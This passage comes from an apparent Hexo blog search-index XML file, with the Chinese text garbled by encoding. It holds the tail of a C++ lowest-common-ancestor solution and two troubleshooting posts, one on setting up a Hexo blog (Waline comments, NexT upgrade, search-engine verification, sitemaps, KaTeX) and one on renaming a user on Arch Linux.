class="built_in">lowestCommonAncestor</span>(root-&gt;left, p, q);</span><br><span class="line">    <span class="keyword">auto</span> right = <span class="built_in">lowestCommonAncestor</span>(root-&gt;right, p, q);</span><br><span class="line">    <span class="keyword">if</span> (left &amp;&amp; right) <span class="keyword">return</span> root;</span><br><span class="line">    <span class="keyword">if</span> (left) <span class="keyword">return</span> left;</span><br><span class="line">    <span class="keyword">return</span> right;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ã€Šå‰‘æŒ‡offerã€‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexoåšå®¢è¸©å‘</title>
      <link href="/2022/11/04/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-hexo%E5%8D%9A%E5%AE%A2%E8%B8%A9%E5%9D%91/"/>
      <url>/2022/11/04/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-hexo%E5%8D%9A%E5%AE%A2%E8%B8%A9%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>ç¬”è€…åŸè®¡åˆ’åœ¨åŸåšå®¢ä¸­å¢åŠ è¯„è®ºåŠŸèƒ½ï¼Œä»¥åŠè®©Googleå’Œç™¾åº¦æ”¶å½•è‡ªå·±çš„åšå®¢ï¼Œæ²¡æƒ³åˆ°è¸©å‘èŠ±äº†å·®ä¸å¤šæ•´ä¸ªä¸Šåˆ+ä¸‹åˆçš„æ—¶é—´ï¼Œæ•…å†™ç¯‡åšå®¢è®°å½•ä¸€ä¸‹è¸©è¿‡çš„å‘ã€‚</p><span id="more"></span><p>ä¸»è¦å‚è€ƒäº† <a href="https://qianfanguojin.top/categories/Hexo%E5%8D%9A%E5%AE%A2/">è°¢åŒå­¦çš„åšå®¢ : : Hexoä¸“æ </a> å’Œä¸€äº›å®˜æ–¹æ–‡æ¡£ï¼Œä¸‹é¢ä»‹ç»ä¸€äº›è‡ªå·±è¸©è¿‡çš„å‘ï¼š</p><h1 id="æ­å»ºWaline-è¯„è®º-Vercelè®¾ç½®ç¯å¢ƒå˜é‡æ—¶è¾“é”™å">æ­å»ºWaline è¯„è®º-Vercelè®¾ç½®ç¯å¢ƒå˜é‡æ—¶è¾“é”™å</h1><p>é—®é¢˜æè¿°ï¼šåœ¨Vercelæ·»åŠ ç¯å¢ƒå˜é‡è¿›è¡ŒRedeployåç‚¹å‡»visitå°±å¯ä»¥å‰å¾€è¯„è®ºé¡µé¢äº†ï¼Œç»“æœç™»é™†å’Œæ³¨å†Œéƒ½è¿”å›500ï¼ˆæœªåˆå§‹ï¼‰ï¼Œæœ€åå‘ç°æ˜¯ç¯å¢ƒå˜é‡åå†™é”™äº†ã€‚</p><p>è§£å†³æ–¹æ³•ï¼šVercelæ·»åŠ ç¯å¢ƒå˜é‡æ—¶ï¼Œåç§°ä¸æ˜¯<code>Lean Cloud</code>è€Œæ˜¯å¯¹åº”çš„<code>Vercel Environment</code>åï¼ˆè‡ªå·±åº”è¯¥æ—©ç‚¹æƒ³åˆ°ï¼šç¯å¢ƒå˜é‡ä¸éƒ½æ˜¯å¤§å†™å­—æ¯å’Œ_ç»„åˆçš„æ ·å­ï¼‰</p><table><thead><tr><th>Lean Cloud</th><th>Vercel Environment</th></tr></thead><tbody><tr><td>AppID</td><td>LEAN_ID</td></tr><tr><td>AppKey</td><td>LEAN_KEY</td></tr><tr><td>MasterKey</td><td>LEAN_MASTER_KEY</td></tr></tbody></table><h1 id="å‡çº§nextè‡³ç‰ˆæœ¬8ä»¥æ”¯æŒWaline">å‡çº§nextè‡³ç‰ˆæœ¬8ä»¥æ”¯æŒWaline</h1><p>é—®é¢˜æè¿°ï¼šåœ¨nextçš„é…ç½®æ–‡ä»¶ä¸­æ·»åŠ walineæ”¯æŒåï¼Œå‘ç°æ‰§è¡Œ<code>hexo g &amp;&amp; hexo s</code>åæŠ¥é”™ï¼Œé€šè¿‡æ£€æŸ¥<code>theme/next/package.json</code>æ–‡ä»¶å‘ç°æ˜¯ç‰ˆæœ¬æ˜¯7ï¼ˆä¹Ÿå¯ä»¥é€šè¿‡åœ¨hexoåšå®¢ç›®å½•æ‰§è¡Œ<code>npm list</code>æŸ¥çœ‹hexoå’Œnextç‰ˆæœ¬ï¼‰ã€‚</p><p>è§£å†³æ–¹å¼ï¼šå‡çº§nextä¸»é¢˜ã€‚</p><p>ç›´æ¥æ”¾<a href="https://theme-next.js.org/docs/getting-started/upgrade.html">å®˜ç½‘é“¾æ¥ : : Upgrade</a>å§ï¼Œç”±äºäººæƒ…äº‹æ•…ï¼Œv8å’Œv7ä»“åº“åä¸åŒï¼Œæ•…æ— æ³•é€šè¿‡<code>git pull</code>è¿›è¡Œå‡çº§ã€‚</p><p>å®˜ç½‘ä»‹ç»çš„å¾ˆå……åˆ†ï¼Œç¬”è€…å†æé†’ä¸€ä¸ªåœ°æ–¹ï¼Œå°±æ˜¯<a href="https://theme-next.js.org/docs/getting-started/installation.html">Installation</a>æŒ‡å‘çš„<a href="https://theme-next.js.org/docs/getting-started/configuration.html">Alternate Theme Config</a> è¯´æ˜äº†åº”å½“æŠŠnextçš„é…ç½®æ–‡ä»¶æ”¾åœ¨hexoçš„æ ¹ç›®å½•ä¸‹ã€‚ç¬”è€…é‡‡ç”¨çš„æ–¹æ³•æ˜¯å¤åˆ¶nextçš„<code>_config.yml</code>æ–‡ä»¶ï¼Œç„¶åæ”¾è¿›hexoçš„<code>_config.yml</code>æ–‡çš„<code>theme_config:</code>ä¸­ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/2022/11/04/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-hexo%E5%8D%9A%E5%AE%A2%E8%B8%A9%E5%9D%91/image-20221106211028338.png" alt></p><h1 id="Hexoæ–‡ç« å›¾ç‰‡æ˜¾ç¤ºé—®é¢˜">Hexoæ–‡ç« å›¾ç‰‡æ˜¾ç¤ºé—®é¢˜</h1><p>é—®é¢˜æè¿°ï¼šä¹‹å‰é€šè¿‡é…ç½®è§£å†³å¥½äº†æ˜¾ç¤ºé—®é¢˜ï¼Œä½†æ˜¯ç”±äºæœ¬äººå¸è½½è¿‡</p><p>è§£å†³æ–¹æ³•ï¼šæ‰§è¡Œ<code>npm install https://github.com/7ym0n/hexo-asset-image</code>å®‰è£…æ”¹ç‰ˆçš„<code>hexo-asset-image</code></p><p><strong>ä¼˜é›…å¼•ç”¨å›¾ç‰‡çš„æ–¹æ³•ï¼šï¼ˆç¼–è¾‘å™¨å’Œåšå®¢ä¸­éƒ½æ­£ç¡®æ˜¾ç¤ºï¼Œä¸”æ’å…¥å›¾ç‰‡æ–¹ä¾¿ï¼‰</strong></p><ul><li><p>åœ¨<code>Hexo</code>ç›®å½•ä¸‹<code>_config.yml</code> ä¸­æœ‰ <code>post_asset_folder</code>å°†å…¶è®¾ç½®ä¸º<code>true</code>ã€‚è¿™æ ·åœ¨å»ºç«‹æ–‡ä»¶æ—¶<code>Hexo</code>ä¼šè‡ªåŠ¨å»ºç«‹ä¸€ä¸ªä¸æ–‡ç« åŒåçš„æ–‡ä»¶å¤¹ï¼Œè¿™æ ·å°±å¯ä»¥æŠŠä¸è¯¥æ–‡ç« ç›¸å…³çš„æ‰€æœ‰èµ„æºï¼ˆå›¾ç‰‡Hï¼‰éƒ½æ”¾åˆ°é‚£ä¸ªæ–‡ä»¶å¤¹é‡Œæ–¹ä¾¿åé¢å¼•ç”¨ã€‚</p></li><li><p>æ‰§è¡Œ<code>npm install https://github.com/7ym0n/hexo-asset-image</code>å®‰è£…æ”¹ç‰ˆçš„<code>hexo-asset-image</code></p></li><li><p>è®¾ç½®typoraåå¥½ï¼Œåœ¨å›¾åƒè®¾ç½®ä¸­è¿›è¡Œå¦‚ä¸‹è®¾ç½®ï¼Œä½¿å¾—åœ¨ç¼–è¾‘è¿‡ç¨‹ä¸­æ’å…¥å›¾ç‰‡æ—¶ï¼Œtyporaä¼šè‡ªåŠ¨å°†å›¾ç‰‡æ”¾å…¥å¯¹åº”æ–‡ä»¶å¤¹ï¼Œå¹¶ä½¿ç”¨typoraå’Œåšå®¢éƒ½èƒ½è¯†åˆ«çš„è·¯å¾„</p></li></ul><p><img src="/2022/11/04/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-hexo%E5%8D%9A%E5%AE%A2%E8%B8%A9%E5%9D%91/image-20221106212313568.png" alt></p><p>å‚è€ƒï¼š</p><h1 id="è®©Googleå°å§å’Œåº¦å¨˜çŸ¥é“è‡ªå·±çš„Githubåšå®¢">è®©Googleå°å§å’Œåº¦å¨˜çŸ¥é“è‡ªå·±çš„Githubåšå®¢</h1><h2 id="Step1ï¼šéªŒè¯è°·æ­Œå’Œç™¾åº¦æ˜¯å¦å·²ç»æ”¶å½•è‡ªå·±çš„ç½‘ç«™">Step1ï¼šéªŒè¯è°·æ­Œå’Œç™¾åº¦æ˜¯å¦å·²ç»æ”¶å½•è‡ªå·±çš„ç½‘ç«™</h2><p>ç½‘ç«™åœ¨æ²¡æœ‰æäº¤æœç´¢å¼•æ“æ”¶å½•ä¹‹å‰ï¼Œç›´æ¥æœç´¢ä½ ç½‘ç«™çš„å†…å®¹æ˜¯æœä¸åˆ°çš„ï¼Œå› ä¸ºæœç´¢å¼•æ“ä¸ä¼šå»æ£€ç´¢ä½ çš„Githubä»“åº“ã€‚ä½†è¿˜æ˜¯å¾—å…ˆéªŒè¯ä¸€ä¸‹ï¼š</p><p>åœ¨è°·æ­Œæœç´¢å’Œç™¾åº¦æœç´¢ä¸­åˆ†åˆ«è¾“å…¥<code>site:https://&lt;blogUrl&gt; </code> å¦‚æœæœä¸åˆ°å°±éªŒè¯äº†æœªè¢«æ”¶å½•ï¼›å¦åˆ™ï¼Œåº”å½“è¿›è¡Œä»¥ä¸‹æ“ä½œ</p><h2 id="Step2ï¼šç«™ç‚¹éªŒè¯">Step2ï¼šç«™ç‚¹éªŒè¯</h2><p>è®¿é—®<a href="https://search.google.com/search-console">search.google.com/search-console</a>ï¼Œé€‰æ‹©<code>Add property</code>:</p><p><img src="/2022/11/04/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-hexo%E5%8D%9A%E5%AE%A2%E8%B8%A9%E5%9D%91/image-20221108145146113.png" alt></p><p>æ¨èé€‰æ‹©<code>HTMLæ ‡ç­¾éªŒè¯</code>ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;google-site-verification&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&lt;bverify code&gt;&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>åªéœ€è¦å¤åˆ¶contentå¯¹åº”çš„å€¼ï¼ˆä¸åŒ…æ‹¬æ‹¬å·ï¼‰ï¼Œç„¶åç²˜è´´è¿›ä¸»é¢˜ï¼ˆå¦‚<code>NexT</code>ï¼‰çš„<code>_config.yml</code>ä¸­çš„<code>google-site-verification:  </code> åé¢å°±è¡Œã€‚</p><p><img src="/2022/11/04/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-hexo%E5%8D%9A%E5%AE%A2%E8%B8%A9%E5%9D%91/image-20221108145826335.png" alt></p><p><a href="https://ziyuan.baidu.com/dashboard/index">ç™¾åº¦éªŒè¯</a>åŒç†ã€‚</p><p>æ³¨æ„ï¼šåˆ°è¿™é‡Œï¼Œç”±äºåœ¨æœ¬åœ°æ“ä½œï¼Œè¿˜ä¸èƒ½å®ŒæˆéªŒè¯ã€‚ä½†æ˜¯åœ¨æœ¬åœ°åšå®¢æŸ¥çœ‹ç½‘é¡µæºç æ—¶å·²ç»èƒ½çœ‹åˆ°<code>&lt;meta name=&quot;google-site-verification&quot; content=&quot;&lt;bverify code&gt;&quot; /&gt;</code>æ ‡ç­¾äº†ã€‚</p><h2 id="Step3ï¼šç»™ç«™ç‚¹æ·»åŠ sitemap">Step3ï¼šç»™ç«™ç‚¹æ·»åŠ sitemap</h2><p>ç«™ç‚¹åœ°å›¾(Site Map)æ˜¯ç”¨æ¥æ³¨æ˜ç½‘ç«™ç»“æ„çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬å¸Œæœ›æœç´¢å¼•æ“çš„çˆ¬è™«äº†è§£æˆ‘ä»¬çš„ç½‘ç«™ç»“æ„ï¼Œä»¥ä¾¿äºé«˜æ•ˆçˆ¬å–å†…å®¹ï¼Œå¿«é€Ÿå»ºç«‹ç´¢å¼•ã€‚</p><p>æ’ä»¶å¯ä»¥å¸®åŠ©æˆ‘ä»¬ä¾¿æ·å®Œæˆsitemapå»ºç«‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-sitemap --save # è°·æ­Œ</span><br><span class="line">npm install hexo-generator-baidu-sitemap --save # ç™¾åº¦</span><br></pre></td></tr></table></figure><p>å®‰è£…å®Œæ‰§è¡Œ<code>hexo clean &amp;&amp; hexo g</code>ï¼Œå·²ç»èƒ½åœ¨publicæ–‡ä»¶å¤¹ä¸­çœ‹åˆ°å¯¹åº”çš„<code>sitemap.xml</code>å’Œ<code>baidusitemap.xml</code>äº†ã€‚</p><p>ç„¶åæ‰§è¡Œ<code>hexo d</code>æ›´æ–°github pagesï¼Œå°±å¯ä»¥å®Œæˆgoogleå’Œç™¾åº¦çš„éªŒè¯äº†ã€‚</p><p>ä¸è¿‡å®ŒæˆéªŒè¯åéœ€è¦ä¸€æ®µæ—¶é—´æ‰èƒ½è®©ç«™ç‚¹è¢«æœç´¢åˆ°ã€‚</p><p>å‚è€ƒ: <a href="https://huiyu-li.github.io/2019/11/27/Tools/2019-11-27-%E8%AE%A9%E8%B0%B7%E6%AD%8C%E6%90%9C%E7%B4%A2%E5%88%B0%E8%87%AA%E5%B7%B1%E5%86%8DGitHub%E4%B8%8A%E7%9A%84%E5%8D%9A%E5%AE%A2/">è®©è°·æ­Œæœç´¢åˆ°è‡ªå·±åœ¨GitHubä¸Šçš„åšå®¢</a></p><h1 id="ä¸»é¢˜ä»NexTä¿®æ”¹ä¸ºbutterfly">ä¸»é¢˜ä»NexTä¿®æ”¹ä¸ºbutterfly</h1><p>è¯šç„¶NexTå¾ˆä¼˜ç§€ï¼Œä½†æ˜¯ç¬”è€…éœ€è¦ä¸€æ¬¾åŠŸèƒ½æ›´åŠ å¼ºå¤§ï¼ˆä¸»è¦æ˜¯æƒ³è¯•è¯•æ›´åŠ èŠ±é‡Œèƒ¡å“¨ï¼‰çš„ä¸»é¢˜ï¼Œæ‰€ä»¥é€‰æ‹©äº†butterflyã€‚ä½“éªŒä¸€å¤©åï¼Œbutterflyéå¸¸å¼ºå¤§ï¼Œä¸”å¯å®šåˆ¶åŒ–ç¨‹åº¦é«˜ï¼Œéå¸¸é€‚åˆè‡ªå·±ã€‚ä¸‹é¢åˆ†äº«è‡ªå·±è¸©è¿‡çš„å‡ ä¸ªå‘ã€‚</p><h2 id="katexä¸æ¸²æŸ“">katexä¸æ¸²æŸ“</h2><p>ä¸¥æ ¼å®‰è£…<a href="https://butterfly.js.org/posts/ceeb73f/#Math-%E6%95%B8%E5%AD%B8">å®˜ç½‘æ•™ç¨‹</a>æ“ä½œï¼Œç»“æœ<code>katex</code>ä¾ç„¶æ— æ³•æ­£å¸¸æ¸²æŸ“ï¼ˆä½†<code>mathjax</code>å¯æ­£å¸¸ä½¿ç”¨ï¼‰ã€‚ç»è¿‡é•¿æœŸæ¢ç´¢ï¼ŒæŸ¥çœ‹<code>npm list</code>ç»“æœæ—¶å‘ç°æœ‰ä¸ªåŒ…<code>hexo-renderer-pandoc</code>ï¼Œå°è¯•åˆ é™¤åå‘ç°<code>katex</code>å¯ä»¥æ­£å¸¸æ¸²æŸ“äº†ğŸ¤£</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm un hexo-renderer-pandoc --save </span><br></pre></td></tr></table></figure><h2 id="é…ç½®hexo-renderer-markdown-it">é…ç½®hexo-renderer-markdown-it</h2><p>ä¹‹å‰ä¸€ç›´æƒ³è®©hexoåšå®¢æ”¯æŒæ‰©å±•è¯­æ³•ï¼šæ¯”å¦‚<mark>æ–‡å­—é«˜äº®ã€ä¸Šä¸‹æ ‡</mark>ã€‚ä½†æ˜¯hexoé»˜è®¤çš„<code>hexo-renderer-marked</code>æ¸²æŸ“æ’ä»¶éš¾ä»¥å‡ä»»æ­¤ä»»åŠ¡ï¼Œä¸Šé¢åœ¨é…ç½®katexæ—¶å·²ç»å®‰è£…äº†<code>hexo-renderer-markdown-it</code>ã€‚åªéœ€è¦å¼€å¯ä¸€äº›æ’ä»¶å°±èƒ½å®ç°æ–‡å­—é«˜äº®ç­‰åŠŸèƒ½ <a href="https://blog.bugimg.com/works/hexo-renderer-markdown-it_and_plugins_config.html#anchors">CXPLAY : : hexo-renderer-markdown-it çš„é…ç½®ä¸æ’ä»¶é…ç½®</a></p>]]></content>
      
      
      <categories>
          
          <category> è¸©å‘è®°å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ArchLinuxç”¨æˆ·æ›´åè¸©å‘</title>
      <link href="/2022/11/04/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-ArchLinux%E7%94%A8%E6%88%B7%E6%9B%B4%E5%90%8D%E8%B8%A9%E5%9D%91/"/>
      <url>/2022/11/04/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-ArchLinux%E7%94%A8%E6%88%B7%E6%9B%B4%E5%90%8D%E8%B8%A9%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>ç”¨æˆ·æ›´åï¼Œè¿™ä¹ˆé‡è¦çš„äº‹æƒ…åƒä¸‡ä¸èƒ½çœ‹ç‚¹æ‚ä¸ƒæ‚å…«çš„blogå°±åŠ¨æ‰‹ï¼ˆè¯´çš„å°±æ˜¯æœ¬æ–‡ï¼Œå½“ç„¶å¾—å…ˆçœ‹æœ€æ–°çš„<a href="https://wiki.archlinux.org/title/Users_and_groups_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#%E4%BF%AE%E6%94%B9%E7%99%BB%E5%BD%95%E5%90%8D%E6%88%96%E4%B8%BB%E7%9B%AE%E5%BD%95">archwiki</a>å‘€ï¼</p><span id="more"></span><h1 id="wikiåœ£ç»éƒ¨åˆ†">wikiåœ£ç»éƒ¨åˆ†</h1><ul><li>æŒ‰ç…§wikiåœ£ç»ä½¿ç”¨<code>usermod</code>æ›´æ”¹ç”¨æˆ·ä¸»ç›®å½•å’Œç”¨æˆ·ç™»å½•å</li><li>ä¿®æ”¹<code>/etc/sudoers</code></li><li>ä¿®æ”¹<code>~/.bashrc</code>ã€<code>~/.zshrc</code>ã€<code>.config/fish/config.fish</code>: å°†<code>/home/&lt;oldname&gt;</code>éƒ½æ›¿æ¢ä¸º<code>$HOME</code> ï¼ˆä¹‹å‰è´ªå›¾æ–¹ä¾¿rootçš„<code>.*shrc</code>é…ç½®æ–‡ä»¶éƒ½æ˜¯ä»ç”¨æˆ·ç›®å½•ä¸‹å»ºç«‹è½¯é“¾æ¥è¿‡å»çš„â€¦â€¦åæ‚”.jpgï¼‰</li></ul><h1 id="è¸©å‘éƒ¨åˆ†">è¸©å‘éƒ¨åˆ†</h1><p>wikiä¸­æåˆ°çš„æœ€åä¸€ç‚¹ï¼Œæ‰æ˜¯æŠ˜è…¾çš„å¼€å§‹ï¼š</p><blockquote><ul><li>ç³»ç»Ÿï¼ˆæ¡Œé¢å¿«æ·æ–¹å¼ï¼Œè„šæœ¬ç­‰ï¼‰é‡Œä½¿ç”¨äº†æ—§çš„ç”¨æˆ·ä¸»ç›®å½•çš„åœ°æ–¹ï¼Œéƒ½éœ€è¦è¿›è¡Œä¿®æ”¹ã€‚è¦åœ¨è„šæœ¬ä¸­é¿å…è¿™æ ·çš„é—®é¢˜ï¼Œå¯ä»¥ä½¿ç”¨<code>~</code>æˆ–<code>$HOME</code>å˜é‡æ¥è¡¨ç¤ºä¸»ç›®å½•ã€‚</li></ul></blockquote><p>å»ºè®®æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼šç¡®ä¿ä½ ä¸æ˜¯ä½¿ç”¨ä½ è¦ä¿®æ”¹çš„ç”¨æˆ·åç™»å½•ï¼ŒåŒæ—¶æŒ‰ä¸‹(<code>Ctrl</code>+<code>Alt</code>+<code>F1</code>)æ‰“å¼€ä¸€ä¸ªæ–°çš„ç»ˆç«¯ï¼Œä½¿ç”¨rootç”¨æˆ·ç™»å½•ï¼Œç„¶åæ‰§è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line">sed -i <span class="string">&quot;s/&lt;oldname&gt;/&lt;newname&gt;/g&quot;</span> `grep &lt;oldname&gt; -rl &lt;newname&gt;` <span class="comment"># é€’å½’å°†/home/&lt;newname&gt;ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ä¸­&lt;oldname&gt;æ›¿æ¢ä¸º&lt;newname&gt; </span></span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯æœªæ‰§è¡Œä»¥ä¸Šæ“ä½œå¯¼è‡´çš„è¸©å‘è¡Œä¸ºï¼ˆç¾ã€‚</p><h2 id="anaconda-miniconda">anaconda/miniconda</h2><p>**é—®é¢˜æè¿°ï¼š**æ‰§è¡Œ<code>printenv | grep &lt;oldname&gt;</code>å‘ç°<code>PATH</code>ã€<code>CONDA_PYTHON_EXE</code>ç­‰ç¯å¢ƒå˜é‡æœªè¢«ä¿®æ”¹ï¼ˆæ­¤æ—¶<code>.*shrc</code>å·²ç»ä¿®æ”¹ï¼‰ã€‚</p><p>å‘ç°ä»¥ä¸‹å‡ ä¸ªæ–‡ä»¶ä¸­åœ¨ä½¿ç”¨ç»å¯¹è·¯å¾„æ—¶ä½¿ç”¨<oldname>å¯¼è‡´ç¯å¢ƒå˜é‡ä¸­å‡ºç°<oldname></oldname></oldname></p><ul><li><code>miniconda3/etc/profile</code>å’Œ<code>miniconda3/etc/fish</code>ä¸¤ä¸ªç›®å½•ä¸‹ä¸­æ–‡ä»¶æ–‡ä»¶</li><li><code>miniconda3/shell/condabin/conda-hook.ps1</code></li><li><code>~/.conda/environments.txt</code></li></ul><p><strong>è§£å†³æ–¹æ³•ï¼š<strong>ä¿®æ”¹å®Œåœ¨shä¸­æ‰§è¡Œcondaç­‰å‘½ä»¤å°±ä¸ä¼šæŠ¥é”™å•¦ï¼Œ<strong>ä½†æ˜¯<code>miniconda3/bin</code>ä¸‹å¯æ‰§è¡Œæ–‡ä»¶é¦–è¡ŒåŸºæœ¬éƒ½æ˜¯<code>#!/home/&lt;oldname&gt;/miniconda3/bin/python3.9</code></strong>ï¼Œæˆ‘æ²¡æœ‰æµ‹è¯•è¿è¡Œpythonç¨‹åºï¼Œä½†çŒœæµ‹å¯èƒ½åç»­è¿è¡Œæ—¶ä¼šæŠ¥é”™ï¼Œå› æ­¤å»ºè®®</strong>é‡è£…</strong><code>anaconda/miniconda</code></p><h2 id="è½¯é“¾æ¥ï¼ˆç¬”è€…è‡ªå·±è®¾ç½®æŒ–çš„å‘ï¼‰">è½¯é“¾æ¥ï¼ˆç¬”è€…è‡ªå·±è®¾ç½®æŒ–çš„å‘ï¼‰</h2><p><strong>å‘½ä»¤è½¯é“¾æ¥ï¼š</strong> ä¹‹å‰æœ‰é€šè¿‡<code>ln -s</code>åˆ›å»ºè½¯é“¾æ¥åˆ°<code>/usr/local/bin</code>ç›®å½•ä¸‹ï¼Œç”±äºéƒ½æ”¾åœ¨è¯¥ç›®å½•ä¸‹æ‰€ä»¥å»æ£€æŸ¥ä¸€ä¸‹å°±å¥½å•¦ã€‚</p><p><strong>è½¯é“¾æ¥å…±äº«æ–‡ä»¶ï¼š</strong></p><ul><li><p>rootçš„<code>.zshrc</code>å’Œ<code>.p10k.zsh</code>éƒ½æ˜¯é€šè¿‡æ™®é€šç”¨æˆ·é“¾æ¥è¿‡å»çš„</p></li><li><p>google-chromeå’Œchromiumå…±äº«é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬å†å²ä¿¡æ¯ç­‰)ï¼Œæ–‡ä»¶ä½ç½®ä½äº<code>.config/google-chrome</code>å’Œ<code>.config/chromium</code></p></li></ul><p><code>unlink</code>æ‰ç„¶åé‡æ–°å»ºç«‹é“¾æ¥å§ã€‚</p><h2 id="KDEåº”ç”¨">KDEåº”ç”¨</h2><blockquote><p>plasmaè®¾è®¡æŒºä¼˜ç§€çš„ï¼Œå¯èƒ½ä¼šå‡ºä¸€ç‚¹å°é—®é¢˜ï¼Œæ€»ä½“ä¸Šæ²¡å•¥å¤§é—®é¢˜ã€‚</p></blockquote><h3 id="dolphinçš„å¸¸ç”¨ç›®å½•">dolphinçš„å¸¸ç”¨ç›®å½•</h3><p>é—®é¢˜æè¿°ï¼šç‚¹å‡»å¸¸ç”¨ç›®å½•é‡Œçš„<code>æ¡Œé¢(/Desktop)</code>ç„¶åæç¤º<code>\home\&lt;oldname&gt;\Desktop</code>æœªæ‰¾åˆ°ã€‚</p><p>è§£å†³æ–¹æ³•ï¼šè¿›å…¥plasmasettingå‘ç°å¸¸ç”¨ä½ç½®é‡Œå„ä¸ªç›®å½•è·¯å¾„éƒ½æ”¹ä¸ºäº†<newname>å¯¹äºçš„è·¯å¾„ï¼Œæœ¬æ¥è¿˜ä»¥ä¸ºæ˜¯å•¥é…ç½®æ–‡ä»¶æ²¡ä¿®æ”¹åˆ°ä½ï¼Œç»“æœå‘ç°dolphinå¸¸ç”¨ä½ç½®é‡Œçš„<code>æ¡Œé¢</code>åŸæ¥æ˜¯å¯ä»¥å³é”®åé€‰æ‹©<code>ç¼–è¾‘</code>çš„ï¼Œä¿®æ”¹ä¸‹è·¯å¾„å°±å¥½ã€‚</newname></p><h3 id="å¤´åƒ-å£çº¸-é”å±å£çº¸">å¤´åƒ &amp; å£çº¸ &amp; é”å±å£çº¸</h3><p>è®¾ç½®éƒ½æ²¡äº†ï¼Œé‡æ–°è®¾ç½®å°±å¥½äº†ï¼ˆæ’ä¸€å˜´ï¼šæ„Ÿè§‰plasmaé»˜è®¤çš„å£çº¸å…¶å®æŒºè€çœ‹çš„ï¼Œè¶Šçœ‹è¶Šå¥½çœ‹ï¼‰ã€‚</p><h2 id="é…ç½®æ–‡ä»¶é‡è¦çš„è½¯ä»¶">é…ç½®æ–‡ä»¶é‡è¦çš„è½¯ä»¶</h2><blockquote><p>æ¨èä¿®æ”¹é…ç½®æ–‡ä»¶æˆ–è€…åˆ é™¤é…ç½®æ–‡ä»¶ã€‚</p></blockquote><h3 id="virtual-box">virtual box</h3><p>é—®é¢˜æè¿°ï¼š<code>vbox</code>ç•Œé¢æŠ¥é”™ä¿¡æ¯åŒ…å«<oldname></oldname></p><p>è§£å†³æ–¹å¼ï¼šå¯ä»¥åˆ é…ç½®æ–‡ä»¶ä¹Ÿå¯ä»¥ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼ˆå°†<code>ï½/Virtualbox VMs</code>ä¸­çš„è™šæ‹Ÿæœºé…ç½®æ–‡ä»¶å’Œ<code>.config/virtualbox</code>ä¸­<code>\home\&lt;oldname&gt;</code>æ”¹ä¸º<code>$HOME</code>åº”è¯¥å°±è¡Œï¼‰ã€‚</p><h2 id="é…ç½®æ–‡ä»¶ä¸é‡è¦çš„è½¯ä»¶">é…ç½®æ–‡ä»¶ä¸é‡è¦çš„è½¯ä»¶</h2><blockquote><p>åˆ é™¤é…ç½®æ–‡ä»¶é‡æ–°ç™»é™†å°±å¥½å•¦ã€‚</p></blockquote><h3 id="baidunetdisk">baidunetdisk</h3><p>é—®é¢˜æè¿°ï¼šç™¾åº¦ç½‘ç›˜ä¸‹è½½æ—¶æ˜¾ç¤ºè·¯å¾„æ— æƒé™ï¼Œä¸‹è½½å¤±è´¥ã€‚</p><p>è§£å†³æ–¹æ³•ï¼šé‡è£…æ— æ•ˆï¼ˆå¸è½½æ—¶ä¿ç•™ç€é…ç½®æ–‡ä»¶ï¼‰ï¼Œè¿˜å¥½é©¬ä¸ŠçŒœåˆ°äº†æ˜¯ç”¨æˆ·æ›´åå¯¼è‡´çš„é—®é¢˜ï¼Œç›´æ¥<code>rm -rf ~/.config/baidunetdisk/</code>åˆ é™¤é…ç½®æ–‡ä»¶ï¼Œç„¶åé‡æ–°ç™»é™†å§ã€‚</p><blockquote><p>å¯èƒ½è¿˜æœ‰å…¶ä»–çš„å‘ï¼ˆå‘ç°äº†å†æ›´æ–°å§â€¦â€¦</p><p>archwikiè™½ç„¶å¼ºå¤§ä½†å¯¹æ–°æ‰‹ä¸å¤ªä¼˜åŒ–ï¼Œå¼ºæ¨ä¸€ä»½archlinuxç®€æ˜æŒ‡å—ï¼š<a href="https://arch.icekylin.online/">arch.icekylin.online/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> è¸©å‘è®°å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
